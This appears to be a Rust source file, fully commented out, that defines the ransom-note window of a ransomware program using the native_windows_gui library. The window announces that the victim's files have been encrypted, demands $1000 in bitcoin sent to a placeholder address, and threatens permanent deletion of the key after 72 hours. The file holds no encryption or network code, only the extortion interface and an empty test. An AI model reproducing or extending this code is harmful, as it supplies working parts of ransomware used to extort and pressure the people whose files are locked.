// use native_windows_gui as nwg;
// use native_windows_derive::NwgUi;
// use nwg::NativeUi;

// #[derive(Default, NwgUi)]
// pub struct PaymentWindow {
//     #[nwg_control(size: (620, 500), position: (300, 100), title: "Payment Required", flags: "WINDOW|VISIBLE")]
//     #[nwg_events(OnWindowClose: [PaymentWindow::close])]
//     window: nwg::Window,

//     #[nwg_control(text: "ATTENTION: YOUR FILES HAVE BEEN ENCRYPTED", position: (20, 10), size: (600, 90), flags: "VISIBLE")]
//     header: nwg::Label,

//     #[nwg_control(text: "", position: (20, 70), size: (600, 410), flags: "VISIBLE|VSCROLL|AUTOVSCROLL", readonly: true)]
//     instructions: nwg::TextBox,
// }

// impl PaymentWindow {
//     fn close(&self) {
//         nwg::stop_thread_dispatch();
//     }
// }

// pub fn show_payment_window() {
//     nwg::init().expect("Failed to init Native Windows GUI");
    
//     let _app = PaymentWindow::build_ui(Default::default()).expect("Failed to build UI");
    
//     // Set the instructions text after creation
//     let instructions_text = 
//         "What happened to your files?\r\n\r\n\
//         All your important files have been encrypted with military-grade encryption ¯\\_(ツ)_/¯\r\n\r\n\
//         But don't worry, you can get them back (˶ᵔ ᵕ ᵔ˶)\r\n\r\n\r\n\r\n\
//         All you need to do is follow these instructions:\r\n\r\n\
//         1. Send $1000 worth of bitcoin to the following address:\r\n\
//            -insert address-\r\n\r\n\
//         2. Include your public key in the payment reference.\r\n\r\n\
//         3. You will receive the decryption key and instructions on the decryption process \r\n\
//         within 24 hours.\r\n\r\n\r\n\
//         WARNING: You have 72 hours to pay. After this time, the decryption key will be\r\n\
//         permanently deleted and your files will be lost forever.";
    
//     _app.instructions.set_text(instructions_text);
    
//     // Set header font and styling
//     let mut font = nwg::Font::default();
//     nwg::Font::builder()
//         .family("Arial")
//         .size(20)
//         .weight(900)
//         .build(&mut font)
//         .expect("Failed to build font");
//     _app.header.set_font(Some(&font));
    
//     nwg::dispatch_thread_events();
// }

// #[cfg(test)]
// mod tests {
//     use super::*;

//     #[test]
//     fn test_payment_window() {
//         // This is just a placeholder test
//         assert!(true);
//     }
// }
